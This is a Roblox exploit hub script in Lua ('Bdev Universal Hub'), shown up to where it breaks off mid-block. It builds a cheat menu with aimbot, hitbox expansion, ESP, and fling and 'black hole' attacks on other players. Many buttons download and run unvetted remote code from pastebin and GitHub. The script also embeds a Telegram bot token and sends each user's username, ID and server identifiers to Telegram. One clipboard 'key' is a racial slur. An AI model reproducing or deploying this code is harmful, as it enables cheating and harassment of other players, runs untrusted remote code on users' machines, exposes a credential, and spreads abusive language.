print("[Bdev] Bdev Hub Is loading...Please subscribe to telegram channel")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local Rayfield = nil
local ok, err = pcall(function()
Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
end)
if not ok or not Rayfield then
warn("[Bdev] sirius.menu failed: " .. tostring(err) .. " trying fallback")
local ok2, err2 = pcall(function()
Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/Qrto1/TestHub/main/source.lua'))()
end)
if not ok2 or not Rayfield then
error("[Bdev] Rayfield load failed both urls: " .. tostring(err2))
end
end
print("[Bdev] Rayfield ok:", Rayfield ~= nil)
local AkaliNotif = nil
pcall(function()
AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/akaliedited.lua"))()
end)
local Notify = AkaliNotif and AkaliNotif.Notify or function() end
local BdevGameName = ""
pcall(function()
BdevGameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end)
local BdevUsername = Players.LocalPlayer.Name
pcall(function()
Notify({
UseYWXOcustoms = true,
Title = BdevGameName,
TitleTextSize = 15,
Description = "Enjoy " .. BdevUsername,
DescriptionTextSize = 11,
Duration = 5,
ImageID = "17695230289",
AutoImageScale = true,
ImagePos = "right",
ContainerPosition = UDim2.new(0, 20, 0.5, -20)
})
end)
local Settings = {
    AimEnabled = false,
    AimWay = "Camera",
    CameraPart = "Head",
    BodyPart = "HumanoidRootPart",
    AimTeamCheck = false,
    AimWallCheck = false,
    AimFriendCheck = false,
    AimTargetPlayers = {},
    AimPredictionEnabled = false,
    AimPredictionTime = 0,
    HitboxTargetPlayers = {},
    HitboxEnabled = false,
    HitboxSize = 10,
    HitboxTransparency = 0.5,
    HitboxColor = "Red",
    HitboxTeamCheck = false,
    HitboxFriendCheck = false,
    EspEnabled = false,
    EspName = false,
    EspHighlight = false,
    EspLine = false,
    EspBox = false,
    EspColor = "Red",
    AntiFling = false,
    AntiBang = false,
    AntiVoid = false,
    AntiRagdoll = false,
    FlingTarget = "",
    BlackHoleActive = false,
    BlackHoleAngle = 0,
    BlackHoleRadius = 10,
    InvisibilityActive = false,
    SpectateActive = false,
    SpectateTarget = "",
    TargetingPlayer = "",
    HeadsitActive = false,
    CarpetActive = false,
    FakeLagActive = false,
    GhostActive = false,
    RobloxEgorActive = false
}
local AntiVoidPlatform = Instance.new("Part")
AntiVoidPlatform.Name = "Bdev_AntiVoid_Platform"
AntiVoidPlatform.Size = Vector3.new(30, 1, 30)
AntiVoidPlatform.Anchored = true
AntiVoidPlatform.Transparency = 1
AntiVoidPlatform.CanCollide = false
AntiVoidPlatform.Parent = Workspace
local ColorMap = {
    ["Red"] = Color3.fromRGB(255, 0, 0), ["Blue"] = Color3.fromRGB(0, 0, 255),
    ["Green"] = Color3.fromRGB(0, 255, 0), ["Yellow"] = Color3.fromRGB(255, 255, 0),
    ["White"] = Color3.fromRGB(255, 255, 255), ["Black"] = Color3.fromRGB(0, 0, 0),
    ["Purple"] = Color3.fromRGB(128, 0, 128)
}
local FakeClone = nil
local GhostClone = nil
local RealSavedCFrame = nil
local GhostSavedCFrame = nil
local FakeLagTrack = nil
local EgorTrack = nil
local Tracers = {}
local function setupBlackHole()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local Folder = Workspace:FindFirstChild("Bdev_BlackHole_Folder") or Instance.new("Folder", Workspace)
    Folder.Name = "Bdev_BlackHole_Folder"
    local Part = Folder:FindFirstChild("BH_Anchor") or Instance.new("Part", Folder)
    Part.Name = "BH_Anchor"
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1
    local Attachment1 = Part:FindFirstChild("BH_Att") or Instance.new("Attachment", Part)
    Attachment1.Name = "BH_Att"
    return humanoidRootPart, Attachment1
end
local bhHumanoidRootPart, bhAttachment1 = setupBlackHole()
LocalPlayer.CharacterAdded:Connect(function()
    bhHumanoidRootPart, bhAttachment1 = setupBlackHole()
end)
if not getgenv().Network then
    getgenv().Network = {
        BaseParts = {},
        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
    }
    Network.RetainPart = function(part)
        if typeof(part) == "Instance" and part:IsA("BasePart") and part:IsDescendantOf(Workspace) then
            table.insert(Network.BaseParts, part)
            part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
            part.CanCollide = false
        end
    end
    local function EnablePartControl()
        LocalPlayer.ReplicationFocus = Workspace
        RunService.Heartbeat:Connect(function()
            pcall(function()
                sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
                for _, part in pairs(Network.BaseParts) do
                    if part:IsDescendantOf(Workspace) then
                        part.Velocity = Network.Velocity
                    end
                end
            end)
        end)
    end
    EnablePartControl()
end
local function ForcePart(v)
    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
        for _, x in next, v:GetChildren() do
            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                x:Destroy()
            end
        end
        if v:FindFirstChild("Attachment") then v:FindFirstChild("Attachment"):Destroy() end
        if v:FindFirstChild("AlignPosition") then v:FindFirstChild("AlignPosition"):Destroy() end
        if v:FindFirstChild("Torque") then v:FindFirstChild("Torque"):Destroy() end
        v.CanCollide = false
        local Torque = Instance.new("Torque", v)
        Torque.Torque = Vector3.new(1000000, 1000000, 1000000)
        local AlignPosition = Instance.new("AlignPosition", v)
        local Attachment2 = Instance.new("Attachment", v)
        Torque.Attachment0 = Attachment2
        AlignPosition.MaxForce = math.huge
        AlignPosition.MaxVelocity = math.huge
        AlignPosition.Responsiveness = 500
        AlignPosition.Attachment0 = Attachment2
        AlignPosition.Attachment1 = bhAttachment1
        Network.RetainPart(v)
    end
end
local Window = Rayfield:CreateWindow({
   Name = "Bdev Universal Hub",
   Icon = 0,
   LoadingTitle = "Rayfield Interface Suite",
   LoadingSubtitle = "by Sirius",
   ConfigurationSaving = { Enabled = false },
   KeySystem = false
})
local CombatTab = Window:CreateTab("Combat", "sword")
local AntiTab = Window:CreateTab("Anti", "shield")
local FunTab = Window:CreateTab("Fun", "smile")
local AimToggle = CombatTab:CreateToggle({
   Name = "Aim", CurrentValue = false, Flag = "AimToggle",
   Callback = function(Value) Settings.AimEnabled = Value end,
})
local AimWayDropdown = CombatTab:CreateDropdown({
   Name = "Choose Aim Way", Options = {"Camera", "Body"}, CurrentOption = {"Camera"}, MultipleOptions = false, Flag = "AimWay",
   Callback = function(Options) Settings.AimWay = Options[1] end,
})
local CameraPartDropdown = CombatTab:CreateDropdown({
   Name = "Camera Choose Part", Options = {"Head", "HumanoidRootPart", "UpperTorso"}, CurrentOption = {"Head"}, MultipleOptions = false, Flag = "CameraPart",
   Callback = function(Options) Settings.CameraPart = Options[1] end,
})
local BodyPartDropdown = CombatTab:CreateDropdown({
   Name = "Body Choose Part", Options = {"Head", "HumanoidRootPart", "UpperTorso"}, CurrentOption = {"HumanoidRootPart"}, MultipleOptions = false, Flag = "BodyPart",
   Callback = function(Options) Settings.BodyPart = Options[1] end,
})
local PredictionToggle = CombatTab:CreateToggle({
   Name = "Prediction", CurrentValue = false, Flag = "PredictionToggle",
   Callback = function(Value) Settings.AimPredictionEnabled = Value end,
})
local PredictionTimeInput = CombatTab:CreateInput({
   Name = "Prediction Time", CurrentValue = "0", PlaceholderText = "Seconds", RemoveTextAfterFocusLost = false, Flag = "PredictionTime",
   Callback = function(Text) local num = tonumber(Text) if num then Settings.AimPredictionTime = num end end,
})
local AimTeamToggle = CombatTab:CreateToggle({
   Name = "Team Check", CurrentValue = false, Flag = "AimTeamCheck",
   Callback = function(Value) Settings.AimTeamCheck = Value end,
})
local AimWallToggle = CombatTab:CreateToggle({
   Name = "Wall Check", CurrentValue = false, Flag = "AimWallCheck",
   Callback = function(Value) Settings.AimWallCheck = Value end,
})
local AimFriendToggle = CombatTab:CreateToggle({
   Name = "Friend Check", CurrentValue = false, Flag = "AimFriendCheck",
   Callback = function(Value) Settings.AimFriendCheck = Value end,
})
local AimPlayerDropdown = CombatTab:CreateDropdown({
   Name = "Player List (Empty = All)", Options = {}, CurrentOption = {}, MultipleOptions = true, Flag = "AimPlayerList",
   Callback = function(Options) Settings.AimTargetPlayers = Options end,
})
local CombatUpdateBtn = CombatTab:CreateButton({
   Name = "Update List", Callback = function() AutoUpdateAllLists() end,
})
local HitboxSection = CombatTab:CreateSection("Hitbox")
local HitboxToggle = CombatTab:CreateToggle({
   Name = "Hitbox", CurrentValue = false, Flag = "HitboxToggle",
   Callback = function(Value) Settings.HitboxEnabled = Value end,
})
local HitboxSizeInput = CombatTab:CreateInput({
   Name = "Size", CurrentValue = "10", PlaceholderText = "Enter size", RemoveTextAfterFocusLost = false, Flag = "HitboxSize",
   Callback = function(Text) local num = tonumber(Text) if num then Settings.HitboxSize = num end end,
})
local HitboxColorDropdown = CombatTab:CreateDropdown({
   Name = "Color", Options = {"Red", "Blue", "Green", "Yellow", "White", "Black", "Purple"}, CurrentOption = {"Red"}, MultipleOptions = false, Flag = "HitboxColorFlag",
   Callback = function(Options) Settings.HitboxColor = Options[1] end,
})
local HitboxTransInput = CombatTab:CreateInput({
   Name = "Transparency", CurrentValue = "0.5", PlaceholderText = "0 to 1", RemoveTextAfterFocusLost = false, Flag = "HitboxTransFlag",
   Callback = function(Text) local num = tonumber(Text) if num then Settings.HitboxTransparency = math.clamp(num, 0, 1) end end,
})
local HitboxTeamToggle = CombatTab:CreateToggle({
   Name = "Team Check", CurrentValue = false, Flag = "HitboxTeamCheck",
   Callback = function(Value) Settings.HitboxTeamCheck = Value end,
})
local HitboxFriendToggle = CombatTab:CreateToggle({
   Name = "Friend Check", CurrentValue = false, Flag = "HitboxFriendCheck",
   Callback = function(Value) Settings.HitboxFriendCheck = Value end,
})
local HitboxPlayerDropdown = CombatTab:CreateDropdown({
   Name = "Player List (Hitbox)", Options = {}, CurrentOption = {}, MultipleOptions = true, Flag = "HitboxPlayerListFlag",
   Callback = function(Options) Settings.HitboxTargetPlayers = Options end,
})
local EspSection = CombatTab:CreateSection("Section ESP")
local EspToggle = CombatTab:CreateToggle({
   Name = "ESP", CurrentValue = false, Flag = "EspMasterToggle",
   Callback = function(Value) Settings.EspEnabled = Value end,
})
local EspNameToggle = CombatTab:CreateToggle({
   Name = "Esp Name", CurrentValue = false, Flag = "EspNameToggle",
   Callback = function(Value) Settings.EspName = Value end,
})
local EspHighlightToggle = CombatTab:CreateToggle({
   Name = "Esp Highlight", CurrentValue = false, Flag = "EspHighlightToggle",
   Callback = function(Value) Settings.EspHighlight = Value end,
})
local EspLineToggle = CombatTab:CreateToggle({
   Name = "Esp Line", CurrentValue = false, Flag = "EspLineToggle",
   Callback = function(Value) Settings.EspLine = Value end,
})
local EspBoxToggle = CombatTab:CreateToggle({
   Name = "Esp Box", CurrentValue = false, Flag = "EspBoxToggle",
   Callback = function(Value) Settings.EspBox = Value end,
})
local EspColorDropdown = CombatTab:CreateDropdown({
   Name = "Color", Options = {"Red", "Blue", "Green", "Yellow", "White", "Black", "Purple"}, CurrentOption = {"Red"}, MultipleOptions = false, Flag = "EspColorFlag",
   Callback = function(Options) Settings.EspColor = Options[1] end,
})
local AntiFlingToggle = AntiTab:CreateToggle({
   Name = "Anti Fling", CurrentValue = false, Flag = "AntiFling",
   Callback = function(Value) Settings.AntiFling = Value end,
})
local AntiBangToggle = AntiTab:CreateToggle({
   Name = "Anti Bang", CurrentValue = false, Flag = "AntiBang",
   Callback = function(Value) Settings.AntiBang = Value end,
})
local AntiVoidToggle = AntiTab:CreateToggle({
   Name = "Anti Void", CurrentValue = false, Flag = "AntiVoid",
   Callback = function(Value) Settings.AntiVoid = Value end,
})
local AntiRagdollToggle = AntiTab:CreateToggle({
   Name = "Anti Ragdoll", CurrentValue = false, Flag = "AntiRagdoll",
   Callback = function(Value) Settings.AntiRagdoll = Value end,
})
local FlingPlayerDropdown = FunTab:CreateDropdown({
   Name = "Choose Player (Fling)", Options = {}, CurrentOption = {}, MultipleOptions = false, Flag = "FlingTarget",
   Callback = function(Options) Settings.FlingTarget = Options[1] end,
})
local FlingButton = FunTab:CreateButton({
   Name = "Fling", Callback = function() ExecuteFlingAttack() end,
})
local FunUpdateBtn = FunTab:CreateButton({
   Name = "Update List", Callback = function() AutoUpdateAllLists() end,
})
local BHSection = FunTab:CreateSection("Black Hole")
local BlackHoleToggle = FunTab:CreateToggle({
   Name = "Black Hole", CurrentValue = false, Flag = "BlackHoleToggle",
   Callback = function(Value)
       Settings.BlackHoleActive = Value
       if Settings.BlackHoleActive then
           for _, v in next, Workspace:GetDescendants() do ForcePart(v) end
       else
           if bhAttachment1 then bhAttachment1.WorldCFrame = CFrame.new(0, -1000, 0) end
           task.spawn(function()
               for _, v in next, Workspace:GetDescendants() do
                   if v:IsA("BasePart") then
                       local t = v:FindFirstChildOfClass("Torque")
                       local a = v:FindFirstChildOfClass("AlignPosition")
                       if t then t:Destroy() end
                       if a then a:Destroy() end
                   end
               end
           end)
       end
   end,
})
local BHAngleInput = FunTab:CreateInput({
   Name = "Angle", CurrentValue = "0", PlaceholderText = "Angle", RemoveTextAfterFocusLost = false, Flag = "BHAngle",
   Callback = function(Text) local num = tonumber(Text) if num then Settings.BlackHoleAngle = num end end,
})
local BHRadiusInput = FunTab:CreateInput({
   Name = "Radius", CurrentValue = "10", PlaceholderText = "Radius", RemoveTextAfterFocusLost = false, Flag = "BHRadius",
   Callback = function(Text) local num = tonumber(Text) if num then Settings.BlackHoleRadius = num end end,
})
local InvisSection = FunTab:CreateSection("Invisibility")
local InvisibilityToggle = FunTab:CreateToggle({
   Name = "Invisibility", CurrentValue = false, Flag = "InvisToggle",
   Callback = function(Value)
       Settings.InvisibilityActive = Value
       local char = LocalPlayer.Character
       if not char then return end
       local hrp = char:FindFirstChild("HumanoidRootPart")
       local hum = char:FindFirstChildOfClass("Humanoid")
       if Value then
           if hrp and hum then
               if Settings.GhostActive then Settings.GhostActive = false end
               hrp.Velocity = Vector3.new(0,0,0)
               RealSavedCFrame = hrp.CFrame
               char.Archivable = true
               FakeClone = char:Clone()
               FakeClone.Name = "Fake_" .. LocalPlayer.Name
               for _, obj in ipairs(FakeClone:GetDescendants()) do
                   if obj:IsA("BasePart") then
                       obj.Transparency = 0.5
                       obj.CanCollide = (obj.Name == "HumanoidRootPart" or obj.Name == "Head") and false or true
                   elseif obj:IsA("Decal") then obj.Transparency = 0.5
                   elseif obj:IsA("Script") or obj:IsA("LocalScript") then obj:Destroy() end
               end
               FakeClone.Parent = Workspace
               local cloneAnimate = FakeClone:FindFirstChild("Animate")
               if cloneAnimate then cloneAnimate.Disabled = true; task.wait(); cloneAnimate.Disabled = false end
               hum:ChangeState(Enum.HumanoidStateType.Physics)
               task.wait(0.05)
               hrp.CFrame = CFrame.new(-1263378.625, 1674000.375, 1201721.5)
               Camera.CameraSubject = FakeClone:FindFirstChildOfClass("Humanoid")
           end
       else
           if FakeClone then
               local fakeHrp = FakeClone:FindFirstChild("HumanoidRootPart")
               if fakeHrp then RealSavedCFrame = fakeHrp.CFrame end
               FakeClone:Destroy(); FakeClone = nil
           end
           if hrp and hum and RealSavedCFrame then hrp.CFrame = RealSavedCFrame; hum:ChangeState(Enum.HumanoidStateType.GettingUp) end
           Camera.CameraSubject = hum
       end
   end
})
local SpecSection = FunTab:CreateSection("Spectate")
local SpectateToggle = FunTab:CreateToggle({
   Name = "Spectate", CurrentValue = false, Flag = "SpecToggle",
   Callback = function(Value)
       Settings.SpectateActive = Value
       if not Value then Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid") end
   end
})
local SpecDropdown = FunTab:CreateDropdown({
   Name = "Player List (Spectate)", Options = {}, CurrentOption = {}, MultipleOptions = false, Flag = "SpecTarget",
   Callback = function(Options) Settings.SpectateTarget = Options[1] end,
})
local TargetSection = FunTab:CreateSection("Targeting")
local HeadsitToggle = FunTab:CreateToggle({
   Name = "Headsit", CurrentValue = false, Flag = "HeadsitToggle",
   Callback = function(Value) Settings.HeadsitActive = Value; if Value and Settings.CarpetActive then Settings.CarpetActive = false end end
})
local CarpetToggle = FunTab:CreateToggle({
   Name = "Carpet", CurrentValue = false, Flag = "CarpetToggle",
   Callback = function(Value) Settings.CarpetActive = Value; if Value and Settings.HeadsitActive then Settings.HeadsitActive = false end end
})
local TargetDropdown = FunTab:CreateDropdown({
   Name = "Select Player", Options = {}, CurrentOption = {}, MultipleOptions = false, Flag = "TargetingPlayer",
   Callback = function(Options) Settings.TargetingPlayer = Options[1] end,
})
local FakeLagSection = FunTab:CreateSection("Fake Lag")
local FakeLagToggle = FunTab:CreateToggle({
   Name = "Fake Lag", CurrentValue = false, Flag = "FakeLagToggle",
   Callback = function(Value)
       Settings.FakeLagActive = Value
       local char = LocalPlayer.Character
       local hrp = char and char:FindFirstChild("HumanoidRootPart")
       local hum = char and char:FindFirstChildOfClass("Humanoid")
       if Value and hrp and hum then
           hrp.Anchored = true
           local animate = char:FindFirstChild("Animate")
           local walkAnim = animate and animate:FindFirstChild("walk") and animate.walk:FindFirstChildOfClass("Animation")
           if walkAnim and hum:FindFirstChildOfClass("Animator") then
               FakeLagTrack = hum:FindFirstChildOfClass("Animator"):LoadAnimation(walkAnim)
               FakeLagTrack.Looped = true
               FakeLagTrack:Play()
           end
       else
           if hrp then hrp.Anchored = false end
           if FakeLagTrack then FakeLagTrack:Stop(); FakeLagTrack:Destroy(); FakeLagTrack = nil end
       end
   end
})
local GhostSection = FunTab:CreateSection("Ghost")
local GhostToggle = FunTab:CreateToggle({
   Name = "Ghost", CurrentValue = false, Flag = "GhostToggle",
   Callback = function(Value)
       Settings.GhostActive = Value
       local char = LocalPlayer.Character
       if not char then return end
       local hrp = char:FindFirstChild("HumanoidRootPart")
       local hum = char:FindFirstChildOfClass("Humanoid")
       if Value then
           if hrp and hum then
               if Settings.InvisibilityActive then Settings.InvisibilityActive = false end
               hrp.Velocity = Vector3.new(0,0,0)
               GhostSavedCFrame = hrp.CFrame
               char.Archivable = true
               GhostClone = char:Clone()
               GhostClone.Name = "Ghost_" .. LocalPlayer.Name
               for _, obj in ipairs(GhostClone:GetDescendants()) do
                   if obj:IsA("BasePart") then
                       obj.Transparency = 0.5
                       obj.CanCollide = (obj.Name == "HumanoidRootPart" or obj.Name == "Head") and false or true
                   elseif obj:IsA("Decal") then obj.Transparency = 0.5
                   elseif obj:IsA("Script") or obj:IsA("LocalScript") then obj:Destroy() end
               end
               GhostClone.Parent = Workspace
               local cloneAnimate = GhostClone:FindFirstChild("Animate")
               if cloneAnimate then cloneAnimate.Disabled = true; task.wait(); cloneAnimate.Disabled = false end
               hum:ChangeState(Enum.HumanoidStateType.Physics)
               task.wait(0.05)
               hrp.Anchored = true
               Camera.CameraSubject = GhostClone:FindFirstChildOfClass("Humanoid")
           end
       else
           if hrp then hrp.Anchored = false end
           if GhostClone then
               local gHrp = GhostClone:FindFirstChild("HumanoidRootPart")
               if gHrp then GhostSavedCFrame = gHrp.CFrame end
               GhostClone:Destroy(); GhostClone = nil
           end
           if hrp and hum and GhostSavedCFrame then
               hrp.CFrame = GhostSavedCFrame
               hum:ChangeState(Enum.HumanoidStateType.GettingUp)
           end
           Camera.CameraSubject = hum
       end
   end
})
local EgorSection = FunTab:CreateSection("Roblox Egor")
local EgorToggle = FunTab:CreateToggle({
   Name = "Roblox Egor", CurrentValue = false, Flag = "EgorToggle",
   Callback = function(Value)
       Settings.RobloxEgorActive = Value
       if not Value then
           if EgorTrack then EgorTrack:Stop(); EgorTrack:Destroy(); EgorTrack = nil end
           local char = LocalPlayer.Character
           local hum = char and char:FindFirstChildOfClass("Humanoid")
           if hum then hum.WalkSpeed = 16 end
       end
   end
})

local MiscTab = Window:CreateTab("Misc", 4483362458)
local Label = MiscTab:CreateLabel("Copies Key Means it will save key to your clipboard")
 Button = MiscTab:CreateButton({
    Name = "Script Searcher",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))()
    end,
 })
 Button = MiscTab:CreateButton({
    Name = "Chat BETA",
    Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/rqwEN7QF",true))()
    end,
 })
 Button = MiscTab:CreateButton({
    Name = "RTX And FPS Booster",
    Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/qcqBuz16"))()
    end,
 })
Button = MiscTab:CreateButton({
    Name = "Unnamed ESP",
    Callback = function()
        pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))() end)
    end,
})
Button = MiscTab:CreateButton({
    Name = "infinite Yield",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end,
})
Button = MiscTab:CreateButton({
    Name = "Sky Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
    end,
})
Button = MiscTab:CreateButton({
    Name = "Universal Esp / Aimbot",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Mick-gordon/Hyper-Escape/main/DeleteMobCheatEngine.lua"))()
    end,
})
Button = MiscTab:CreateButton({
    Name = "FE Fling",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/fling/main/all"))()
    end,
})
Button = MiscTab:CreateButton({
    Name = "FE Fling All",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
    end,
})
Button = MiscTab:CreateButton({
    Name = "Sirius",
    Callback = function()
        loadstring(game:HttpGet('https://sirius.menu/script'))();
    end,
})
Button = MiscTab:CreateButton({
    Name = "Nameless Admin",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
    end,
})
Button = MiscTab:CreateButton({
    Name = "Equinox Hub",
    Callback = function()
        loadstring(game:HttpGet(("https://pastebin.com/raw/wzB1Qh78"), true))()
    end,
})
Button = MiscTab:CreateButton({
    Name = "Aimbot",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/aimbot/main/fov"))()
    end,
})
Button = MiscTab:CreateButton({
    Name = "Fly V3",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/fly/main/universal", true))()
    end,
})
Button = MiscTab:CreateButton({
    Name = "FE Animation Changer",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/6pQYX6gU"))()
    end,
})
Button = MiscTab:CreateButton({
	Name = "Orca Hub (Toggle Key = K)",
	Callback = function()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "FE (R6/R15) 210+ Emotes / 31 Animations",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Eazvy/public-scripts/main/Universal_Animations_Emotes.lua"))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "Hitbox",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/KAh6QUm9"))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "Teleport Gui",
	Callback = function()
        loadstring(game:HttpGet("https://gist.githubusercontent.com/DagerFild/b4776075a0d26ef04394133ee6bd2081/raw/0ed51ac94057d2d9a9f00e1b037b9011c76ca54a/tpGUI", true))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "UTH Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Orealated/Oreal/main/orealated.lol%20UTH%20Loader"))();
  	end
})
Button = MiscTab:CreateButton({
	Name = "Chat Bypasser",
	Callback = function()
		setclipboard("P1d#uT")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/Bypass/8e92f1a31635629214ab4ac38217b97c2642d113/vadrifts"))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "Aimbot v1",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/aimbots/main/v1",true))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "Webhook Tool",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/venoxhh/universalscripts/main/webhook_tools"))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "FPS Counter",
	Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/c63s1M4w/raw",true))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "Old Hitbox Expander",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua"))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "Dark Dex",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/HummingBird8/HummingRn/main/OptimizedDexForSolara.lua"))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "Kawaii Freaky Fling",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/KAWAII-FREAKY-FLING/main/kawaii_freaky_fling.lua",true))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "Nano Chat Bypasser ( Copies Key )",
	Callback = function()
        setclipboard("fuckniggers")
		loadstring(game:HttpGet("https://raw.githubusercortent.com/Yeeeter30/NanoAuto/main/NanoBypass.lua",true))()
  	end
})
Button = MiscTab:CreateButton({
	Name = "OP Aimbot And ESP",
	Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/aa4O82Kw/raw",true))()
  	end
})
local Label = MiscTab:CreateLabel("Copies Key Means it will save key to your clipboard")
local GameTab = Window:CreateTab("Game", 4483362458)
local TelegramBotToken = "8879843233:AAEDOGh9XaSIaLuZyn8J0PZiyPygLbhOxc0"
local TelegramChatId = "7891780046"
local SuggestionText = ""
local BugText = ""
local function SendToTelegram(msg)
local HttpService = game:GetService("HttpService")
local url = "https://api.telegram.org/bot" .. TelegramBotToken .. "/sendMessage"
local username = ""
local userid = ""
pcall(function()
username = Players.LocalPlayer.Name
userid = tostring(Players.LocalPlayer.UserId)
end)
local full = msg .. "\nUser: " .. username .. " (" .. userid .. ")" .. "\nPlaceId: " .. tostring(game.PlaceId) .. " GameId: " .. tostring(game.GameId) .. " JobId: " .. tostring(game.JobId)
local body = HttpService:JSONEncode({chat_id = TelegramChatId, text = full})
local headers = {["Content-Type"] = "application/json"}
local req = http_request or request or HttpPost or syn.request
if req then
pcall(function()
req({Url = url, Body = body, Method = "POST", Headers = headers})
end)
end
end
local Button = GameTab:CreateButton({
    Name = "Print Supported Game List",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/iwq1gNg8", true))()
        local Notify = AkaliNotif.Notify;
        Notify({
            UseYWXOcustoms = true,
            Title = "Supported Game List Printed",
            TitleTextSize = 15,
            Description = "Click F9 to see supported game list",
            DescriptionTextSize = 11,
            Duration = 7,
            ImageID = "17695230289",
            AutoImageScale = true,
            ImagePos = "right",
            ContainerPosition = UDim2.new(0, 20, 0.5, -20)
        })
    end
})
local SuggestionInput = GameTab:CreateInput({
Name = "Suggestions",
PlaceholderText = "text your suggestion here..",
RemoveTextAfterFocusLost = true,
Callback = function(Value)
SuggestionText = Value
end
})
local SendSuggestionBtn = GameTab:CreateButton({
Name = "Send Game Suggestion",
Callback = function()
if SuggestionText == "" then return end
SendToTelegram("[Game Suggestion] " .. SuggestionText)
end
})
local BugInput = GameTab:CreateInput({
Name = "Bug Reporter",
PlaceholderText = "text your bug report here..",
RemoveTextAfterFocusLost = true,
Callback = function(Value)
BugText = Value
end
})
local SendBugBtn = GameTab:CreateButton({
Name = "Send Bug Report",
Callback = function()
if BugText == "" then return end
SendToTelegram("[Bug Report] " .. BugText)
end
})
local ImportantPara = GameTab:CreateParagraph({Title = "Important", Content = "You need to click enter after typing in box then click send button"})

local gametab
if game.GameId==1000233041 then
    gametab=Window:CreateTab("3008")
    Button = gametab:CreateButton({
        Name = "Zeerox Hub",
        Callback = function()
            loadstring(game:HttpGet'https://raw.githubusercontent.com/RunDTM/ZeeroxHub/main/Loader.lua')()
          end
    })
    Button = gametab:CreateButton({
        Name = "Tbao Hub",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHub3008"))()
          end
    })
    Button = gametab:CreateButton({
        Name = "Sky Hub",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
          end
    })
    Button = gametab:CreateButton({
        Name = "Nut Hub",
        Callback = function()
            loadstring(game:HttpGet("https://pastefy.app/9rP6GZK8/raw",true))()
          end
    })
elseif game.GameId==5650396773 then
    gametab=Window:CreateTab("A Dusty Trip")
    Button = gametab:CreateButton({
        Name = "Connect Hub",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/ADustyTrip",true))()
          end
    })
    Button = gametab:CreateButton({
        Name = "Auto Farm",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/dusty/main/trip"))()
          end
    })
    Button = gametab:CreateButton({
        Name = "Auto Farm (Click Y To show gui)",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ThacG/DustyTripThac/main/dustytripthac"))()
